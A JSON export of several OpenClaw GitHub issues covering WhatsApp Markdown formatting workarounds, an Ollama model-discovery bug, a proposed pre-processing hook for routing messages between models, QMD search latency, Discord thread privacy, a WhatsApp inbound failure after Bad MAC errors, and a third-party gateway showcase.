      "body": "## Summary\n\nIt would be great to have a configurable outbound text transform hook/middleware for channel plugins, so users can customize message formatting per channel without patching source files.\n\n## Use case\n\nWhatsApp uses its own formatting syntax (e.g. `*bold*` instead of `**bold**`, no support for `[links](url)`, etc.). When an LLM agent generates Markdown responses, these need to be transformed before sending to WhatsApp. Currently the only way to do this is by patching source files directly, which breaks on every update.\n\n## Current workaround\n\nA bash script that patches **both** outbound delivery paths:\n\n1. Injects a `transformMarkdownForWhatsApp()` function into `extensions/whatsapp/src/channel.ts` and wraps `outbound.sendText` / `outbound.sendMedia` — covers the **plugin outbound** path (message tool, explicit sends)\n2. Injects the same transform into `dist/reply-*.js`, `dist/extensionAPI.js`, and `dist/loader-*.js` — covers the **auto-reply** path (`deliverWebReply()` → `msg.reply()`), which is the **primary path** for agent responses\n\nBoth paths must be patched because `deliverWebReply()` bypasses the plugin outbound entirely. This has to be re-applied after every `npm install -g openclaw` update.\n\n\n\n## Proposed solution\n\nOne of the following:\n\n**Option A: Config-based transform**\nAllow specifying a text transform in `openclaw.json` per channel:\n```json\n{\n  \"channels\": {\n    \"whatsapp\": {\n      \"outbound\": {\n        \"textTransform\": \"markdown-to-whatsapp\"\n      }\n    }\n  }\n}\n```\nWith built-in transforms for common conversions (Markdown → WhatsApp, Markdown → plain text, etc.).\n\n**Option B: Plugin hook/middleware**\nWire the existing `message_sending` hook (already defined in plugin types but never called in the delivery pipeline) so channel plugins can register outbound text middleware.\n\n**Option C: Built-in WhatsApp formatting**\nSince Markdown → WhatsApp is a very common need (all LLM agents output Markdown), ship the transform as a built-in feature of the WhatsApp channel plugin, enabled by default or via a config flag. WhatsApp is currently excluded from the Markdown IR pipeline (only Slack/Telegram/Signal use it), so this would fill that gap.\n\n## Environment\n\n- OpenClaw v2026.2.6-3\n- WhatsApp channel via Baileys web",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12129",
      "createdAt": "2026-02-08T22:03:38Z",
      "updatedAt": "2026-02-11T15:52:02Z",
      "author": "kbecking",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp",
          "slack",
          "signal"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3868523654,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12129#issuecomment-3868523654",
          "createdAt": "2026-02-08T23:06:22Z",
          "updatedAt": "2026-02-08T23:08:26Z",
          "author": "kbecking",
          "body": "## Implementation details from our working solution\n\nWe have a fully working patch script that handles this. Sharing implementation details that may help with a native fix.\n\n### Two separate delivery paths need the transform\n\nThis was the hardest part to discover. WhatsApp outbound messages flow through **two independent code paths**:\n\n1. **Plugin outbound** (`outbound.sendText` / `outbound.sendMedia` in `extensions/whatsapp/src/channel.ts`) — used by the `message` tool and explicit sends\n2. **Auto-reply** (`deliverWebReply()` in `dist/reply-*.js`, `dist/extensionAPI.js`, `dist/loader-*.js`) — the **main path** for agent responses. This calls `msg.reply()` directly and bypasses the plugin outbound entirely.\n\nA transform on only path 1 (channel.ts) will NOT format agent replies. Both paths need coverage.\n\n### The transform function\n\nConverts Markdown → WhatsApp syntax:\n- `**bold**` or `__bold__` → `*bold*`\n- `~~strike~~` → `~strike~`\n- `# Heading` → `*Heading*` (bold)\n- `[text](url)` → `text (url)`\n- `![alt](url)` → `alt (url)`\n- Horizontal rules (`---`, `***`) → removed\n- Code blocks and inline code: preserved as-is (WhatsApp supports them natively)\n- Excessive blank lines collapsed to max 2\n\n### Placeholder collision gotcha\n\nWhen protecting code blocks before applying bold conversion, do NOT use `__PLACEHOLDER__` style tokens — they get matched by the `/__(.+?)__/g` bold regex and get corrupted. Use a format that cannot collide, e.g. `%%CB0%%` / `%%IC0%%`.\n\n### Patch point in auto-reply path\n\nIn `deliverWebReply()`, the transform wraps `replyResult.text` before it hits `convertMarkdownTables`:\n\n```js\n// Before:\nchunkMarkdownTextWithMode(convertMarkdownTables(replyResult.text || \"\", tableMode), ...)\n\n// After:\nchunkMarkdownTextWithMode(convertMarkdownTables(transformMarkdownForWhatsApp(replyResult.text || \"\"), tableMode), ...)\n```\n\n### Suggested native approach\n\nOption C from the original proposal (built-in WhatsApp formatting) seems most practical:\n- WhatsApp is excluded from the Markdown IR pipeline (only Slack/Telegram/Signal use it)\n- The `message_sending` hook exists in the plugin types but is **never called** in the delivery pipeline — wiring it would enable Option B as well\n- A config flag like `whatsapp.formatting.markdownTransform: true` (default on) would solve this for everyone"
        },
        {
          "id": 3872835629,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12129#issuecomment-3872835629",
          "createdAt": "2026-02-09T16:49:28Z",
          "updatedAt": "2026-02-09T16:49:28Z",
          "author": "kbecking",
          "body": "### Update: additional root cause discovered (transform ordering)\n\nWhile the original request for a proper outbound text transform hook still stands, we discovered an additional complication with the current patching approach:\n\n**`convertMarkdownTables()` re-renders the entire document when tables are present.** It uses `MARKDOWN_STYLE_MARKERS` which outputs `**...**` for bold. If the WhatsApp transform runs *before* `convertMarkdownTables`, the table converter undoes the `**` → `*` conversion by re-introducing `**` markers.\n\n**Fix:** The transform must run *after* `convertMarkdownTables`, not before:\n```js\n// Wrong order (transform gets undone by table converter):\nconvertMarkdownTables(transformMarkdownForWhatsApp(text), tableMode)\n\n// Correct order:\ntransformMarkdownForWhatsApp(convertMarkdownTables(text, tableMode))\n```\n\nThis reinforces the need for a proper hook point — ideally positioned as the **last transform before `chunkMarkdownTextWithMode`**, so it runs after all internal processing (table conversion, etc.) but before chunking and delivery.\n\nCurrent workaround: patching all 3 dist files (`reply-*.js`, `extensionAPI.js`, `loader-*.js`) + `channel.ts` with a post-install script. Fragile but functional."
        },
        {
          "id": 3877874751,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12129#issuecomment-3877874751",
          "createdAt": "2026-02-10T14:08:47Z",
          "updatedAt": "2026-02-10T14:08:47Z",
          "author": "asklee-klawd",
          "body": "+1 on this — running into exactly this issue.\n\nWe've been working around it with agent-level formatting rules (teaching the LLM to use WhatsApp syntax directly via AGENTS.md), but a native solution would be much cleaner.\n\nOption C (built-in WhatsApp formatting) seems like the right approach — happy to take a crack at a PR if that would help move this forward."
        },
        {
          "id": 3885328712,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12129#issuecomment-3885328712",
          "createdAt": "2026-02-11T15:52:02Z",
          "updatedAt": "2026-02-11T15:52:02Z",
          "author": "kbecking",
          "body": "## Update: WhatsApp client-side rendering quirks identified + workarounds\n\nAfter extensive testing of our patch (v4, 52 tests), we identified three **WhatsApp client-side** rendering bugs that cause formatting to break even when the `*bold*` syntax is technically correct:\n\n### 1. Emoji + bold\nWhatsApp fails to parse `*bold*` when it directly follows an emoji character. The opening `*` is rendered literally.\n\n**Broken:** `✅*Praktisch*` → shows raw `*` before text\n**Fix:** Add space between emoji and `*`: `✅ *Praktisch*`\n\n```js\n// Emoji ranges + optional FE0F/ZWJ suffixes\nr = r.replace(/([\\u{1F300}-\\u{1F9FF}\\u{2600}-\\u{27BF}\\u{2700}-\\u{27BF}\\u{2B50}\\u{2B55}\\u{231A}-\\u{23F3}\\u{23E9}-\\u{23FA}\\u{25AA}-\\u{25FE}\\u{2934}-\\u{2935}\\u{3030}\\u{303D}\\u{3297}\\u{3299}][\\u{FE0F}\\u{200D}]*)\\*([^*\\s\\n])/gu, \"$1 *$2\");\n```\n\n### 2. Multiline bold\nWhatsApp does not render bold across line breaks. `*Groet,\\nKay*` shows raw asterisks.\n\n**Fix:** Split into per-line bold:\n\n```js\nr = r.replace(/\\*\\*((?:[^\\n]*\\n){1,4}[^\\n]*?)\\*\\*/g, (_, content) => {\n  return content.split('\\n').map(line => line.trim() ? `*${line}*` : line).join('\\n');\n});\n```\n\n### 3. Auto-linked content breaks bold\nWhen text inside `*...*` contains file paths or URLs that WhatsApp auto-links (e.g. `*MEMORY.md - description*`), the bold formatting breaks. This is a WhatsApp parser limitation — no server-side workaround possible beyond avoiding bold around linkable content.\n\n### Transform order (reconfirmed)\n\nAs noted in our previous comment, the transform **must** run after `convertMarkdownTables()`:\n\n```\nconvertMarkdownTables() → transformMarkdownForWhatsApp() → chunkMarkdownTextWithMode()\n```\n\n`convertMarkdownTables` re-renders the entire document with `MARKDOWN_STYLE_MARKERS` (`**bold**`) when tables are present. Running the WhatsApp transform before this gets undone.\n\n### Header + bold interaction\n\nWhen headers contain bold (`## **text**`), the header conversion produces `***text***`. The bold regex needs `\\*{2,}` (not exact `\\*\\*`) to catch these. Better yet: strip bold markers inside headers during header conversion (the whole line is already becoming bold):\n\n```js\nr = r.replace(/^#{1,6}\\s+(.+)$/gm, (_, content) => {\n  content = content.replace(/\\*{2,}(.+?)\\*{2,}/g, '$1');\n  content = content.replace(/__(.+?)__/g, '$1');\n  return `*${content}*`;\n});\n```\n\n### Full transform function + test suite\n\nOur complete v4 transform (52 tests, all passing) is available as a reference implementation. Happy to share if useful for a native implementation.\n\nThe ideal native approach remains Option C from the original proposal: add WhatsApp to the existing Markdown IR pipeline alongside Telegram/Slack/Signal. The `message_sending` hook (defined in plugin types but never wired in the delivery pipeline) would also work as an extension point."
        }
      ]
    },
    {
      "number": 14053,
      "title": "[Bug]: Local Ollama model discovery fails despite correct baseUrl configuration",
      "body": "## Summary\n\nWhen using local Ollama with a custom baseUrl, model discovery fails with TypeError: fetch failed, even though the endpoint is reachable and the configured models work correctly for completions.\n\n## Steps to reproduce\n\n1. run openclaw gateway\n2. messages visible afterwards in terminal\n\n## Expected behavior\n\nDiscovery should use the configured baseUrl or skip gracefully when models are manually defined.\n\n## Actual behavior\n\ncurl http://192.168.20.14:11434/v1/models returns valid model list\nCompletions work correctly\nDiscovery logs: Failed to discover Ollama models: TypeError: fetch failed\n\n## Environment\n\nOpenClaw 2026.2.9\nOllama 0.15.6 on Windows\nOpenClaw running in WSL2, Ollama on Windows host\n\n## Logs or screenshots\n\nandrew@NucBoxEVO-X2:~$ curl http://192.168.20.14:11434/\nOllama is running\n\nandrew@NucBoxEVO-X2:~$ curl http://192.168.20.14:11434/v1/models\n{\"object\":\"list\",\"data\":[{\"id\":\"qwen3-coder-next:latest\",\"object\":\"model\",\"created\":1770595843,\"owned_by\":\"library\"}]}\n\n\nuser@NucBoxEVO-X2:~$ openclaw gateway\n\n🦞 OpenClaw 2026.2.9 (33c75cb) — I don't judge, but your missing API keys are absolutely judging you.\n\n10:07:19 Failed to discover Ollama models: TypeError: fetch failed\n10:07:19 Failed to discover Ollama models: TypeError: fetch failed\n10:07:19 [canvas] host mounted at http://127.0.0.1:18789/__openclaw__/canvas/ (root /home/andrew/.openclaw/canvas)\n10:07:19 [heartbeat] started\n10:07:19 [gateway] agent model: ollama/qwen3-coder-next:latest\n10:07:19 [gateway] listening on ws://127.0.0.1:18789 (PID 12443)\n10:07:19 [gateway] listening on ws://[::1]:18789\n10:07:19 [gateway] log file: /tmp/openclaw/openclaw-2026-02-11.log\n10:07:19 [browser/service] Browser control service ready (profiles=2)\n10:07:19 [telegram] [default] starting provider\n10:07:19 [telegram] autoSelectFamily=false (default-node22)\n10:07:35 [ws] webchat connected conn=3af06c1e-5eb7-4585-abcd-a969d2ee00c7 remote=127.0.0.1 client=openclaw-control-ui webchat vdev\n10:07:35 Failed to discover Ollama models: TypeError: fetch failed\n10:07:47 Failed to discover Ollama models: TypeError: fetch failed\n10:07:47 [agent/embedded] Removed orphaned user message to prevent consecutive user turns. runId=afa516ea-1f7f-4c6e-8c85-2e5491bbf65b sessionId=3e57bf57-6f8f-4e91-9062-f1ce4d121223\n10:14:05 Failed to discover Ollama models: TypeError: fetch failed\n10:16:50 Failed to discover Ollama models: TypeError: fetch failed\n10:17:18 Failed to discover Ollama models: TypeError: fetch failed\n10:17:38 Failed to discover Ollama models: TypeError: fetch failed\n10:18:08 Failed to discover Ollama models: TypeError: fetch failed\n10:26:28 [gateway] signal SIGTERM received\n10:26:28 [gateway] received SIGTERM; shutting down\n10:26:28 [gmail-watcher] gmail watcher stopped\n10:26:29 [openclaw] Suppressed AbortError: AbortError: This operation was aborted\n    at node:internal/deps/undici/undici:14902:13\n    at processTicksAndRejections (node:internal/process/task_queues:105:5)\n10:26:29 [ws] webchat disconnected code=1012 reason=service restart conn=3af06c1e-5eb7-4585-abcd-a969d2ee00c7",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14053",
      "createdAt": "2026-02-11T11:20:59Z",
      "updatedAt": "2026-02-11T15:52:01Z",
      "author": "n3w6y",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "signal"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14150,
      "title": "Feature Request: Message Pre-Processing Hook for Request Routing",
      "body": "## Problem Statement\n\nIn multi-model agent setups, the **executing model** is currently responsible for deciding whether to delegate (spawn a subagent) or handle a task itself. This creates an inherent architectural bias: the model that would execute the task is also the one deciding whether to hand it off.\n\nThis is analogous to asking a contractor to honestly assess whether they should subcontract — there is a structural incentive to self-execute. In practice, this results in **50-80% missed delegation** even with explicit system prompt instructions, because:\n\n1. **Helpfulness bias (RLHF):** Models are trained to be maximally helpful, meaning they instinctively start working rather than pausing to route\n2. **Single-pass processing:** There is no separate \"routing phase\" before the \"execution phase\" — both happen simultaneously\n3. **Instruction degradation:** In long system prompts (20-30K tokens), procedural routing rules compete with personality, tools, safety, and memory instructions for attention\n\n## Proposed Solution: `hooks.messagePreProcess`\n\nAdd a configurable pre-processing hook that runs **before** the main model sees the user message. This hook classifies the message and injects routing metadata into the context.\n\n### Architecture\n\n```\nUser message → Pre-process hook (classifier) → Classification injected → Main model\n```\n\nThe classifier runs as a lightweight, fast call that determines routing before the main model engages. This cleanly separates the **routing decision** from the **execution decision**.\n\n## Implementation Approaches\n\nThe hook should support multiple classifier backends to give users flexibility:\n\n### Option A: External API Model (e.g., Haiku, GPT-4o-mini, Gemini Flash)\n\nBest for: Nuanced classification, ambiguous messages, complex routing rules\n\n```yaml\nhooks:\n  messagePreProcess:\n    enabled: true\n    classifier:\n      type: \"api\"\n      model: \"anthropic/claude-haiku-4-5\"  # or openai/gpt-4o-mini, google/gemini-2.0-flash\n      prompt: |\n        Classify this user message for routing. Reply with EXACTLY one token:\n        - DIRECT: trivial, quick lookup, status check, greeting, conversational follow-up\n        - SPAWN_OPUS: research, analysis, investigation, troubleshooting, building, code review, >500 words output\n        - SPAWN_SONNET: batch operations, medium automation, isolated tasks\n        \n        Message: {{message}}\n    action: \"inject\"  # Prepend classification to system context for main model\n    # Alternative actions:\n    # action: \"route\"   # Automatically route to different model/session based on classification\n    # action: \"metadata\" # Add as metadata accessible via {{preprocess.result}}\n```\n\n- **Latency:** ~150-300ms\n- **Cost:** ~$0.00005/message (Haiku), ~$0.00003/message (GPT-4o-mini)\n- **Accuracy:** High — model understands nuance and context\n\n### Option B: Local LLM (via llama.cpp, Ollama, LM Studio)\n\nBest for: Privacy-conscious users, offline operation, zero marginal cost\n\n```yaml\nhooks:\n  messagePreProcess:\n    enabled: true\n    classifier:\n      type: \"local\"\n      endpoint: \"http://localhost:11434/api/generate\"  # Ollama\n      # Or: endpoint: \"http://localhost:8080/completion\"  # llama.cpp server\n      # Or: endpoint: \"http://localhost:1234/v1/chat/completions\"  # LM Studio\n      model: \"llama3.2:1b\"  # Small, fast model for classification\n      prompt: |\n        Classify: DIRECT, SPAWN_OPUS, or SPAWN_SONNET\n        Message: {{message}}\n    action: \"inject\"\n```\n\n- **Latency:** ~50-200ms (depends on model size and hardware)\n- **Cost:** $0 (runs locally)\n- **Accuracy:** Good for clear-cut cases, may need fine-tuning for edge cases\n\n### Option C: Deterministic Rules Engine (Regex/Keyword Matching)\n\nBest for: Predictable routing, zero latency, zero cost, no model dependency\n\n```yaml\nhooks:\n  messagePreProcess:\n    enabled: true\n    classifier:\n      type: \"rules\"\n      rules:\n        - match: \"\\\\b(analyze|research|investigate|troubleshoot|review|audit|build|implement)\\\\b\"\n          qualifiers: \"\\\\b(comprehensive|detailed|thorough|deep dive|in-depth)\\\\b\"\n          result: \"SPAWN_OPUS\"\n        - match: \"\\\\b(batch|bulk|process all|migrate)\\\\b\"\n          result: \"SPAWN_SONNET\"\n        - default: \"DIRECT\"\n    action: \"inject\"\n```\n\n- **Latency:** <1ms\n- **Cost:** $0\n- **Accuracy:** High for well-defined patterns, misses nuanced requests\n\n### Option D: Hybrid (Rules + Model Fallback)\n\n```yaml\nhooks:\n  messagePreProcess:\n    enabled: true\n    classifier:\n      type: \"hybrid\"\n      primary:\n        type: \"rules\"\n        rules: [...]  # Fast deterministic check first\n      fallback:\n        type: \"api\"\n        model: \"anthropic/claude-haiku-4-5\"\n        condition: \"primary.result == UNCERTAIN\"\n    action: \"inject\"\n```\n\n## Action Types\n\nThe hook result should support multiple action modes:\n\n| Action | Behavior |\n|--------|----------|\n| `inject` | Prepend classification to the system prompt or user message |\n| `route` | Automatically route to a different model or spawn a subagent |\n| `metadata` | Store as metadata accessible via template variables |\n| `block` | Reject the message (useful for content filtering) |\n\nThe `route` action would be particularly powerful:\n\n```yaml\nhooks:\n  messagePreProcess:\n    classifier: { ... }\n    action: \"route\"\n    routing:\n      DIRECT: { model: \"anthropic/claude-sonnet-4-5\" }  # Default model\n      SPAWN_OPUS: { spawn: true, model: \"anthropic/claude-opus-4-6\", label: \"Complex Task\" }\n      SPAWN_SONNET: { spawn: true, model: \"anthropic/claude-sonnet-4-5\", label: \"Background Task\" }\n```\n\n## Real-World Use Case\n\nMy setup: Main session runs Sonnet 4.5 (fast, cheap) for conversation. Complex tasks should be spawned to Opus 4.6 subagents for higher quality.\n\n**Current state:** Despite explicit routing instructions in the system prompt (~500 words of routing rules), the main model handles complex tasks inline ~50-80% of the time. Two documented failures in one week where research/investigation tasks matching all spawn criteria were executed by Sonnet instead of being delegated to Opus.\n\n**With pre-process hook:** A Haiku classifier (or local model, or regex rules) would catch these before Sonnet even sees the message, achieving ~95-99% routing accuracy at negligible cost.\n\n## Benefits\n\n1. **Architectural separation:** The model that routes is not the model that executes — eliminates self-serving bias\n2. **Reliability:** Pre-processing happens deterministically before the main model, not as a skippable instruction\n3. **Cost efficiency:** Ensures expensive models are used only when needed; cheap models handle trivial requests\n4. **Flexibility:** Users choose their classifier (API model, local LLM, regex rules, or hybrid)\n5. **Composability:** Can be combined with existing hooks (session-memory, etc.)\n6. **Privacy option:** Local LLM classifier keeps all routing decisions on-device\n\n## Trade-offs\n\n- **Latency:** +50-300ms per message (depending on classifier type; rules engine is <1ms)\n- **Cost:** $0 (rules/local) to ~$0.00005/message (Haiku) — negligible for most users\n- **Complexity:** Additional configuration surface, but opt-in and well-structured\n- **False positives:** Some messages may be misrouted — mitigated by allowing the main model to override with explanation\n\n## Prior Art\n\n- **LangChain/LangGraph:** Router chains that classify and route before execution\n- **Semantic Router:** Embedding-based routing for LLM pipelines\n- **OpenAI Assistants:** Tool-use routing happens in a separate classification step\n- **AWS Bedrock:** Agent routing with classifier-based delegation\n\n## Summary\n\nAdding `hooks.messagePreProcess` would solve a real architectural limitation where the executing model cannot reliably self-assess routing decisions. It is a general-purpose feature that enables request routing, content filtering, context enrichment, and more — while being simple to configure and opt-in.\n\nHappy to discuss implementation details or provide more data on the routing failure patterns that motivated this request.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14150",
      "createdAt": "2026-02-11T15:48:35Z",
      "updatedAt": "2026-02-11T15:48:35Z",
      "author": "rex05ai",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 9048,
      "title": "[Feature]: Use QMD MCP server mode for warm model caching",
      "body": "## Summary\n\nWhen `memory.backend = \"qmd\"` is enabled, OpenClaw spawns a fresh `qmd query` process for each `memory_search` call. This causes **~19 second latency per search** because QMD must cold-load three GGUF models on every invocation:\n\n- embeddinggemma-300M (query embedding)\n- qwen3-reranker-0.6b (reranking)\n- Qwen3-0.6B (query expansion/HyDE)\n\n## Observed Behavior\n\n```\n$ time qmd query \"test query\" --limit 3\n...\nqmd query \"test query\" --limit 3  6.82s user 1.15s system 41% cpu 19.095 total\n```\n\nOnly 41% CPU utilization — most time is spent loading models from disk, not computing.\n\nBy contrast, `qmd vsearch` (vector-only, 1 model) takes ~3s, and `qmd search` (BM25, no models) takes ~0.2s.\n\n## Proposed Solution\n\nQMD already exposes an MCP server (`qmd mcp`) that keeps models warm between queries. Instead of spawning fresh `qmd query` processes, OpenClaw could:\n\n1. Start `qmd mcp` as a persistent sidecar (similar to how other MCP servers are managed)\n2. Send search requests via MCP protocol instead of CLI spawn\n3. Models stay loaded → queries drop from ~19s to ~2-3s\n\nThe QMD MCP server exposes these tools:\n- `qmd_search` - BM25 keyword search\n- `qmd_vsearch` - Vector semantic search  \n- `qmd_query` - Hybrid search with reranking\n- `qmd_get` - Document retrieval\n\n## Alternative: Add vsearch mode option\n\nA simpler alternative would be adding a config option like `memory.qmd.searchMode: \"vsearch\"` to use vector-only search (~3s) instead of the full query pipeline (~19s). This trades some quality (no reranking/query expansion) for 6x speed improvement.\n\n## References\n\n- QMD repo: https://github.com/tobi/qmd\n- OpenClaw QMD skill notes: \"consider keeping the process/model warm (e.g., a long-lived qmd/MCP server mode)\"\n- PR #3160 docs mention \"First search may be slow\" but every search is slow due to per-query process spawning\n\n## Environment\n\n- OpenClaw 2026.2.2\n- QMD (latest from tobi/qmd)\n- macOS (Apple Silicon)\n- Config: `memory.backend: \"qmd\"`, `memory.qmd.limits.timeoutMs: 20000`",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9048",
      "createdAt": "2026-02-04T20:01:37Z",
      "updatedAt": "2026-02-11T15:46:21Z",
      "author": "meretrout",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3885294621,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9048#issuecomment-3885294621",
          "createdAt": "2026-02-11T15:46:21Z",
          "updatedAt": "2026-02-11T15:46:21Z",
          "author": "jonathanadams96",
          "body": "Looking forward to seeing this resolved. QMD is currently unusable on my Digital Ocean VPS (8gb ram, 4 AMD CPU), and this might be what's needed to get it to function."
        }
      ]
    },
    {
      "number": 14147,
      "title": "Discord thread-create defaults to private (type 12) when no messageId provided",
      "body": "## Bug\n\nWhen creating a Discord thread via the `thread-create` action **without a `messageId`**, the thread is created as **private** (type 12) instead of **public** (type 11).\n\n## Root Cause\n\nIn `createThreadDiscord()`, the request body only sets `name` and optionally `auto_archive_duration`. When no `messageId` is provided, the Discord API route `POST /channels/{id}/threads` defaults to type 12 (private thread).\n\n```js\nasync function createThreadDiscord(channelId, payload, opts = {}) {\n  const rest = resolveDiscordRest(opts);\n  const body = { name: payload.name };\n  if (payload.autoArchiveMinutes) body.auto_archive_duration = payload.autoArchiveMinutes;\n  const route = Routes.threads(channelId, payload.messageId);\n  return await rest.post(route, { body });\n}\n```\n\n## Expected Behavior\n\nStandalone threads (no `messageId`) should default to **public** (type 11), since that matches user expectations. Ideally, expose a `type` parameter on the `thread-create` action so users can choose, with `11` (public) as the default.\n\n## Reproduction\n\n```\n# Creates PRIVATE thread (type 12) — unexpected\nmessage thread-create --target <channelId> --threadName \"My Thread\"\n\n# Creates PUBLIC thread (type 11) — works correctly\nmessage thread-create --target <channelId> --messageId <msgId> --threadName \"My Thread\"\n```\n\n## Proposed Fix\n\n1. Add `type` param to `thread-create` action (default: `11`)\n2. Pass `type` in the request body in `createThreadDiscord()`:\n   ```js\n   if (!payload.messageId) body.type = payload.type ?? 11;\n   ```\n\nVerified empirically — see type 11 vs 12 in API responses.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14147",
      "createdAt": "2026-02-11T15:45:45Z",
      "updatedAt": "2026-02-11T15:45:45Z",
      "author": "thedudeabidesai",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "linux"
        ],
        "components": []
      }
    },
    {
      "number": 14146,
      "title": "WhatsApp: Inbound messages stop after Bad MAC Error burst (silent failure, no auto-recovery)",
      "body": "## Bug Description\n\nAfter a burst of **479 \"Bad MAC Error\"** exceptions from `libsignal` (`session_cipher.js` / `crypto.js`), WhatsApp inbound message delivery **silently stops**. The connection appears healthy — status shows \"Listening\" and \"linked\", outbound messages work fine — but **no inbound events are emitted** to the agent.\n\n## Impact\n\nComplete loss of WhatsApp inbound messages with no visible error or warning. The gateway believes it is connected and listening, making this a **silent failure** that is very hard to detect.\n\n## Environment\n\n- **OpenClaw:** 2026.2.9 (upgraded from 2026.2.6-3 during debugging)\n- **OS:** macOS 15.3.2 (Apple Silicon / arm64)\n- **Node.js:** v25.5.0\n- **Install:** `/opt/homebrew/lib/node_modules/openclaw`\n\n## Timeline (2026-02-11)\n\n| Time (UTC) | Event |\n|---|---|\n| ~15:16 | Last successful inbound message received |\n| 15:17:18 | **479× Bad MAC Error** burst in gateway.err.log (all within ~1 second) |\n| 15:21 | Gateway restart #1 — shows \"Listening for personal WhatsApp inbound messages\" — **no inbound** |\n| 15:27 | Gateway restart #2 (SIGUSR1) — same result |\n| 15:31 | Gateway restart #3 — same result |\n| 15:35 | Gateway restart #4 — same result |\n| 15:37 | Gateway restart #5 (after deleting all session/pre-key/app-state files) — same result |\n| ~15:40 | **Outbound message sent** (scheduled cron job) → inbound starts working again |\n\n## Steps to Reproduce\n\n1. WhatsApp connection running normally\n2. Burst of Bad MAC errors occurs (possibly due to Signal protocol session desync)\n3. Inbound handler silently stops emitting events\n4. Gateway restart does not fix it\n5. Deleting session files (`session-*.json`, `device-list-*.json`, `app-state-sync-version-*.json`) does not fix it\n6. Deleting all pre-keys and app-state (keeping only `creds.json`) does not fix it\n\n## Recovery / Workaround\n\n**Sending an outbound WhatsApp message** (any message to any contact) \"wakes up\" the inbound handler and messages start flowing again.\n\n## Relevant Log Excerpts\n\n### Bad MAC Error burst (gateway.err.log) — 479 occurrences at 15:17:18 UTC\n\n```\n2026-02-11T15:17:18.693Z Session error:Error: Bad MAC Error: Bad MAC\n    at Object.verifyMAC (.../libsignal/src/crypto.js:87:15)\n    at SessionCipher.doDecryptWhisperMessage (.../libsignal/src/session_cipher.js:250:16)\n    at SessionCipher.decryptWithSessions (.../libsignal/src/session_cipher.js:147:29)\n    at Object.244211890806916_1.0 [as awaitable] (.../libsignal/src/session_cipher.js:171:28)\n    at _asyncQueueExecutor (.../libsignal/src/queue_job.js:20:29)\n```\n\n### Gateway restarts show \"Listening\" but no inbound (gateway.log)\n\n```\n2026-02-11T15:21:25.273Z [gateway] listening on ws://127.0.0.1:18789 (PID 85929)\n2026-02-11T15:21:27.024Z [whatsapp] Listening for personal WhatsApp inbound messages.\n# ... no inbound messages despite messages being sent to the number ...\n2026-02-11T15:27:59.754Z [gateway] received SIGUSR1; restarting\n2026-02-11T15:28:03.129Z [whatsapp] Listening for personal WhatsApp inbound messages.\n# ... still no inbound ...\n2026-02-11T15:31:18.314Z [whatsapp] Listening for personal WhatsApp inbound messages.\n# ... still no inbound ...\n2026-02-11T15:35:35.155Z [whatsapp] Listening for personal WhatsApp inbound messages.\n# ... still no inbound ...\n2026-02-11T15:38:01.208Z [whatsapp] Listening for personal WhatsApp inbound messages.\n# ... outbound message sent around 15:39 ...\n2026-02-11T15:40:44.590Z [whatsapp] Inbound message +49... (WORKING AGAIN!)\n```\n\n## Expected Behavior\n\n1. Bad MAC errors should be handled gracefully without killing the inbound event listener\n2. If the inbound handler enters a broken state, gateway restart should recover it\n3. At minimum: a warning log should be emitted when the inbound handler is in a degraded state\n4. Ideally: automatic recovery (e.g., send a self-ping or re-register the event listener after MAC errors)\n\n## Suggested Fix Ideas\n\n- After N consecutive MAC errors, automatically trigger a session reset / re-subscribe to inbound events\n- Add health-check: if no inbound messages for X minutes while connection is \"linked\", log a warning and attempt recovery\n- The fact that an outbound message fixes it suggests the underlying Baileys socket reconnects or re-registers handlers on send — this path should also be triggered on error recovery",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14146",
      "createdAt": "2026-02-11T15:45:28Z",
      "updatedAt": "2026-02-11T15:45:28Z",
      "author": "agentz-manfred",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp",
          "signal"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14144,
      "title": "[Project Showcase] Sen-Gateway: High-performance AI Gateway with Echo Retention (V3)",
      "body": "Hello OpenClaw Team,\n\nI'm officially introducing **Sen-Gateway**, an AI model gateway built by @oneles (Senge) that fits perfectly with OpenClaw's vision of efficiency and power.\n\n**Key Highlights:**\n- **Echo Retention (V3) Algorithm**: Optimizes context specifically for Gemini's Prompt Caching mechanism to leverage **0.1x pricing**.\n- **20%-30% Token Savings**: Real-world proven efficiency in long-context and multi-turn scenarios.\n- **Visual Audit Dashboard**: Real-time cost, efficiency analysis, and model interaction logs.\n- **Unified Protocol**: Seamlessly bridges OpenAI, Gemini, and Anthropic models for OpenClaw users.\n\nWe believe this could be a great addition to the OpenClaw ecosystem as a recommended model provider or utility service.\n\n**Project Link**: https://github.com/oneles/Sen-Gateway\n\nBest regards,\nSen-Gateway Team / @oneles",
      "state": "open",
      "comments": 0,
